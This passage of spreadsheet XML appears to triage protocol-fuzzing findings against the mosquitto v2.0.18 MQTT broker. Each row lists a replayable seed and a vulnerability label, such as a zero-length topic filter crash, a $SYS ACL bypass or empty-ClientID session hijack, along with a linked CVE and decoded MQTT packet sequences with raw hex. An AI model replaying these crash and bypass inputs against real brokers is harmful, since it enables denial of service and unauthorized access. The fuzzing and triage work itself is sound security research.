raw_header=3116000d746573742f72657461696e65\u000aMsg[12]: SUBSCRIBE PacketID=2 Topics=[''(零长度!QoS=0)] | raw_header=821200020000006473742f7265746169\u000aMsg[13]: PUBLISH Topic='tesW\x02\x00%e/' QoS=2 retain=False payload='grp/test/topi' | raw_header=3418000974657357020025652f677270\u000aMsg[14]: PINGREQ  | raw_header=c000\u000aMsg[15]: PUBLISH Topic='a/b/c/d/e' QoS=2 retain=True payload_len=53B | raw_header=35400009612f622f632f642f6504ca10\u000aMsg[16]: PUBLISH Topic='test/c' QoS=2 retain=False payload='\x00\x14dataaç\x004¢\x1b\x03\x10\x00\u000atest/topic\x00\x0bsens' | raw_header=34280006746573742f63001464617461\u000aMsg[17]: PUBLISH Topic='test/retained' QoS=0 retain=True payload='keep_me' | raw_header=3116000d746573742f72657461696e65\u000aMsg[18]: SUBSCRIBE PacketID=2 Topics=['test/retained'(QoS=0)] | raw_header=82120002000d746573742f7265746169\u000aMsg[19]: PUBLISH Topic='tesP\x02\x00%b\x02' QoS=2 retain=False payload='\x00\x03\x02\x00\x03¢\x11\x00\x04\x00\u000dfu' | raw_header=34180009746573500200256202000302\u000aMsg[20]: PUBCOMP PacketID=24419 | raw_header=7a7a5f63338239005a00062b2f646174\u000aMsg[21]: TYPE0  | raw_header=0d2473686172652f677270312f230200\u000aMsg[22]: TYPE0  | raw_header=0035400009612f622f632f642f6504ca\u000aMsg[23]: AUTH  | raw_header=fd4a680cbef706cfae571f9234280006\u000aMsg[24]: TYPE0  | raw_header=0d66757a7a5f63338239005a00062b2f\u000aMsg[25]: TYPE0  | raw_header=044d515454ffff003c000766757a7a5f\u000a(尾部423B): 3f46dda0a3db953de40e738efa11b75150e4b06ff5983200505513de8924ccc86aa9680d84fd4a680cbef706cfae571f9234</f>
        <v/>
      </c>
      <c r="F1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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J18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8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90">
      <c r="A190" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000003,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B190" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C190" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000003,sev:3,cat:0181)中的REQUEST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190" s="2">
        <f>== 种子标识: id:000003,sev:3,cat:0181 ===\u000a大小: 792B (报告+请求数据)\u000a请求数据: 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MQTT请求序列(79B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=1792s [持久会话] | raw_header=101300044d5154540400070000007f6c\u000aMsg[2]: (不完整,58B) raw=6c647a5a5f6307678000000002003c000766752affffff80000000010015076780ffffffe0003c00\u000a(尾部58B): 6c647a5a5f6307678000000002003c000766752affffff80000000010015076780ffffffe0003c00070000007f6c645c5a7f</f>
        <v/>
      </c>
      <c r="F1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90" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J1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19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191">
      <c r="A191" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000004,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B191" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C191" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(90B)\u000a4.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91" s="2">
        <f>== 种子标识: id:000004,sev:4,cat:0040 ===\u000a大小: 466B (报告+请求数据)\u000a请求数据: 90B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(90B原始二进制) ---\u000aMsg[1]: (不完整,90B) raw=82a24f001200001d245359532f62726f6b65722f636c69656e74732f636f6e6e6563746564002b76\u000a(尾部90B): 82a24f001200001d245359532f62726f6b65722f636c69656e74732f636f6e6e6563746564002b766572792f646565702f74</f>
        <v/>
      </c>
      <c r="F1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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J19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9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92">
      <c r="A192" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000005,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B192" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C192" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(317B)\u000a4.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92" s="2">
        <f>== 种子标识: id:000005,sev:3,cat:0002 ===\u000a大小: 642B (报告+请求数据)\u000a请求数据: 317B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(317B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=107 Topics=[] | raw_header=827c006b452600152473686172652f67\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload_len=154B | raw_header=34b901001d245359532f62726f6b6572\u000aMsg[3]: (不完整,3B) raw=034040\u000a(尾部3B): 034040</f>
        <v/>
      </c>
      <c r="F1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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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3">
      <c r="A193" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000005,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B193" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C193" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(103B)\u000a4.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93" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:00c0 ===\u000a大小: 667B (报告+请求数据)\u000a请求数据: 103B\u000a\u000a---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MQTT请求序列(103B原始二进制) ---\u000aMsg[1]: SUBSCRIBE  | raw_header=8000\u000aMsg[2]: SUBSCRIBE PacketID=64 Topics=[''(零长度!QoS=2)] | raw_header=8210004000000a746573742f746f7069\u000aMsg[3]: PUBLISH Topic='a/b/c/d/e' QoS=1 retain=True payload_len=70B | raw_header=3b510009612f622f632f642f65004119</f>
        <v/>
      </c>
      <c r="F1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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J19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9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94">
      <c r="A194" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000005,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B194" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C194" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000005,sev:4,cat:00c2)中的REQUEST DATA提取出来(252B)\u000a4.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94" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:00c2 ===\u000a大小: 962B (报告+请求数据)\u000a请求数据: 252B\u000a\u000a---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MQTT请求序列(252B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=185 Topics=[''(零长度!QoS=1)] | raw_header=826200b900001d245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=111B | raw_header=398e01001d245359532f62726f6b6572\u000aMsg[3]: (不完整,7B) raw=99b60000101400\u000a(尾部7B): 99b60000101400</f>
        <v/>
      </c>
      <c r="F1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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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5">
      <c r="A195" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000006,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B195" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C195" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(196B)\u000a4.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95" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0002 ===\u000a大小: 521B (报告+请求数据)\u000a请求数据: 196B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(196B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4 Topics=[] | raw_header=820b00044d5154540502003c28\u000aMsg[2]: CONNECT  | raw_header=1100\u000aMsg[3]: TYPE0  | raw_header=000e1021ffff270fffffff22000a1900\u000aMsg[4]: CONNECT  | raw_header=170126\u000aMsg[5]: TYPE0  | raw_header=00636f6e6e656374656407895a23552f\u000aMsg[6]: UNSUBSCRIBE  | raw_header=a20e001a000a746573742f746f706963\u000aMsg[7]: PUBLISH Topic='$SYS/broker/uptime' QoS=2 retain=False payload='\x00\x1be"temp":22.5}' | raw_header=34230012245359532f62726f6b65722f\u000aMsg[8]: PINGREQ  | raw_header=c000\u000aMsg[9]: (不完整,6B) raw=e010000e1100\u000a(尾部6B): e010000e1100</f>
        <v/>
      </c>
      <c r="F1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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J19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6">
      <c r="A196" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000006,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B196" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C196" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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96" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0082 ===\u000a大小: 720B (报告+请求数据)\u000a请求数据: 208B\u000a\u000a---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MQTT请求序列(208B原始二进制) ---\u000aMsg[1]: (不完整,208B) raw=3180f4823800b6290bc58fbb2b26000b73656e736f722f74656d7000142473686172652f67727032\u000a(尾部208B): 3180f4823800b6290bc58fbb2b26000b73656e736f722f74656d7000142473686172652f677270322f73656e736f722f2300</f>
        <v/>
      </c>
      <c r="F1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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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7">
      <c r="A197" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000006,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B197" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C197" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(281B)\u000a4.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97" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0206 ===\u000a大小: 769B (报告+请求数据)\u000a请求数据: 281B\u000a\u000a---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MQTT请求序列(281B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=6 Topics=[] | raw_header=8285010006220b909fb40e260012686f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=118B | raw_header=308b010013245359532f62726f6b6572\u000aMsg[3]: CONNECT  | raw_header=1101eb</f>
        <v/>
      </c>
      <c r="F1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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J19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198">
      <c r="A198" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000006,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B198" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C198" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(83B)\u000a4.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98" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:0040 ===\u000a大小: 464B (报告+请求数据)\u000a请求数据: 83B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(83B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3489 Topics=[''(零长度!QoS=2), '$SYS/broker/version'(QoS=1), 't'(QoS=1)] | raw_header=821f0da10000020013245359532f6272\u000aMsg[2]: PUBLISH Topic='very/deep/topic/level1/level2/level3/level4' QoS=2 retain=False payload='\u000d¢' | raw_header=342f002b766572792f646565702f746f\u000aMsg[3]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F1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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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19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199">
      <c r="A199" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000006,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B199" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C199" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000006,sev:4,cat:0042)中的REQUEST DATA提取出来(151B)\u000a4.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99" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:0042 ===\u000a大小: 674B (报告+请求数据)\u000a请求数据: 151B\u000a\u000a---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MQTT请求序列(151B原始二进制) ---\u000aMsg[1]: SUBSCRIBE  | raw_header=8200\u000aMsg[2]: SUBSCRIBE PacketID=1631 Topics=[''(零长度!QoS=1)] | raw_header=823b065f0000152473686172652f6772\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload_len=54B | raw_header=3a4b0013245359532f62726f6b65722f\u000aMsg[4]: (不完整,11B) raw=017474745573742f047e02\u000a(尾部11B): 017474745573742f047e02</f>
        <v/>
      </c>
      <c r="F1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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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19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0">
      <c r="A200" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000006,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B200" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C200" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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00" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:00c0 ===\u000a大小: 727B (报告+请求数据)\u000a请求数据: 133B\u000a\u000a---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MQTT请求序列(133B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2886 Topics=[''(零长度!QoS=0), '$share/grp1/test/+'(QoS=2)] | raw_header=821a0b4600000000122473686172652f\u000aMsg[2]: PUBLISH Topic='sensor/temp' QoS=1 retain=True payload='\x0bGsr\x9càlÒQÂ\x1c\x02x2\x82\x89\x7f\x04\x10\x14è?\x0b\x13e§r' | raw_header=3b28000b73656e736f722f74656d700b\u000aMsg[3]: (不完整,63B) raw=a0ff0e1cfafa08fafafa8d9b0afb02fafabcfafa34343434fb02fafabcfafa34342d3434343434fa\u000a(尾部63B): a0ff0e1cfafa08fafafa8d9b0afb02fafabcfafa34343434fb02fafabcfafa34342d3434343434fafadffafafafaff343434</f>
        <v/>
      </c>
      <c r="F2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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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0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01">
      <c r="A201" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000006,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B201" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C201" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(226B)\u000a4.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01" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:00c2 ===\u000a大小: 936B (报告+请求数据)\u000a请求数据: 226B\u000a\u000a---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MQTT请求序列(226B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1022 Topics=[''(零长度!QoS=3)] | raw_header=823103fe00002b766572792f64656570\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload_len=137B | raw_header=3ba801001d245359532f62726f6b6572\u000aMsg[3]: (不完整,4B) raw=82202b69\u000a(尾部4B): 82202b69</f>
        <v/>
      </c>
      <c r="F2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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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0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2">
      <c r="A202" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000006,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B202" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C202" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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将种子文件(id:000006,sev:4,cat:02c4)中的REQUEST DATA提取出来(85B)\u000a4.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02" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:02c4 ===\u000a大小: 811B (报告+请求数据)\u000a请求数据: 85B\u000a\u000a---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MQTT请求序列(85B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=836 Topics=[''(零长度!QoS=1)] | raw_header=82070344000001740d\u000aMsg[2]: PUBLISH Topic='$share/grp2/sensor/#' QoS=0 retain=True payload_len=51B | raw_header=394900142473686172652f677270322f\u000aMsg[3]: DISCONNECT 断开连接 | raw_header=e7</f>
        <v/>
      </c>
      <c r="F2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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J20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0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03">
      <c r="A203" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000007,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B203" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C203" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(206B)\u000a4.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03" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0002 ===\u000a大小: 633B (报告+请求数据)\u000a请求数据: 206B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(206B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=20 | raw_header=62020014\u000aMsg[2]: TYPE0  | raw_header=0200\u000aMsg[3]: SUBSCRIBE PacketID=4698 Topics=[] | raw_header=8279125a360ba9cdf33f26000174002b\u000aMsg[4]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload_len=54B | raw_header=3a4b0013245359532f62726f6b65722f</f>
        <v/>
      </c>
      <c r="F2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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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0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4">
      <c r="A204" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000007,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B204" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C204" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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04" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0082 ===\u000a大小: 780B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MQTT请求序列(166B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4720 Topics=[] | raw_header=82291270220bc2bfbd3326000d247368\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=95B | raw_header=31740013245359532f62726f6b65722f\u000aMsg[3]: TYPE0  | raw_header=0000\u000aMsg[4]: (不完整,3B) raw=007f00\u000a(尾部3B): 007f00</f>
        <v/>
      </c>
      <c r="F2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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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0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5">
      <c r="A205" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000007,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B205" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C205" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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05" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0101 ===\u000a大小: 443B (报告+请求数据)\u000a请求数据: 64B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(64B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=4096s [持久会话] | raw_header=14220000000010000000000000000000\u000aMsg[2]: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(不完整,6B) raw=00e80b00000b\u000a(尾部6B): 00e80b00000b</f>
        <v/>
      </c>
      <c r="F2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0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05" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J20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0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06">
      <c r="A206" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000007,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B206" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C206" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D2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06" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0102 ===\u000a大小: 595B (报告+请求数据)\u000a请求数据: 69B\u000a\u000a---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MQTT请求序列(69B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a20a00020006746573740002\u000aMsg[2]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=91s Will=YES WillTopic='$SYS/broker/version' [自动清理会话] | raw_header=102f00044d5154540436005b00000013\u000aMsg[3]: TYPE0  | raw_header=0006746573742f23</f>
        <v/>
      </c>
      <c r="F2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0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06" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J20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20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7">
      <c r="A207" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000007,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B207" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C207" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(183B)\u000a4.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207" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0206 ===\u000a大小: 676B (报告+请求数据)\u000a请求数据: 183B\u000a\u000a---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MQTT请求序列(183B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=1 | raw_header=62020001\u000aMsg[2]: DISCONNECT 断开连接 | raw_header=e000\u000aMsg[3]: SUBSCRIBE PacketID=3584 Topics=[] | raw_header=82310e002a0be0eef523260015247368\u000aMsg[4]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=103B | raw_header=3c7c0013245359532f62726f6b65722f</f>
        <v/>
      </c>
      <c r="F2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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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0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08">
      <c r="A208" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000007,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B208" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C208" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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08" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0040 ===\u000a大小: 639B (报告+请求数据)\u000a请求数据: 160B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(160B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: SUBSCRIBE PacketID=4871 Topics=[''(零长度!QoS=1)] | raw_header=820a13070000017426000020\u000aMsg[3]: PUBLISH Topic='$share/grp/test/topic' QoS=1 retain=False payload_len=116B | raw_header=328b0100152473686172652f6772702f\u000aMsg[4]: (不完整,4B) raw=00644000\u000a(尾部4B): 00644000</f>
        <v/>
      </c>
      <c r="F2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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J20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0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09">
      <c r="A209" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000007,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B209" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C209" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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09" s="2">
